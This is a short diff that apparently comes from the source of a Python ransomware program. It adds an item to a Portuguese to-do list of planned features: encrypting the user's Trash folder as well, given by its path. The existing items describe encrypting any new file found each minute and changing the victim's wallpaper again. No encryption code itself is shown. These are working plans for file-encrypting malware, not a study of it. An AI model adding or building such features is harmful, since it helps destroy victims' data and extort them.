@@ -72,6 +72,12 @@ NOVAS COISAS :
     de 1 em 1 minuto
     checar se tem algum arquivo novo -> salvar todos os arquivos numa lista. se tiver novo arquivo -> criptografa ele
     trocar o wallpaper dnv
+
+
+
+
+    criptografar lixeira tbm
+    os.path.expanduser('~') + '/.local/share/Trash'
 '''
 
 # Starting point of encrypting
